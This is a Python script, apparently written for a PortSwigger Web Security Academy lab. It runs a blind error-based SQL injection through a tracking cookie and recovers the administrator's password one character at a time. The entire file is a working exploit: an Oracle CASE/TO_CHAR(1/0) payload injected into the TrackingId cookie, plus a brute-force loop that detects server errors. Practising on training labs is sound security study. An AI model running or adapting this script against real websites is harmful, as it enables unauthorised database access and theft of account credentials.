import requests
import string

url="https://ac231f1e1f80f468805ae32200bf00f2.web-security-academy.net/"
#url="http://127.0.0.1:8081"

password=[]
injection="'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
TrackingId="zcMfBbWviWaj3OLs"
session="lIA8LfiJaLbS6R74qv2WXcQjJjss56kQ"

header_dict={"Cookie": "TrackingId=zcMfBbWviWaj3OLs session=lIA8LfiJaLbS6R74qv2WXcQjJjss56kQ",
"Connection": "close",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
}
for i in range(1,21):
    print("\nindex : "+str(i))
    for st in string.printable[1:42]:
        header_dict["Cookie"]="TrackingId=zcMfBbWviWaj3OLs"+injection.format(i,st)+"; session=lIA8LfiJaLbS6R74qv2WXcQjJjss56kQ"
        print("Cookie : "+header_dict["Cookie"],end="\r")
        response = requests.get(url,headers=header_dict)
        if bytes('Internal',"UTF-8") in response.content:
          print("\nSucces : "+st)
          password.append(st)
          break
    

print("".join(str(e) for e in password))
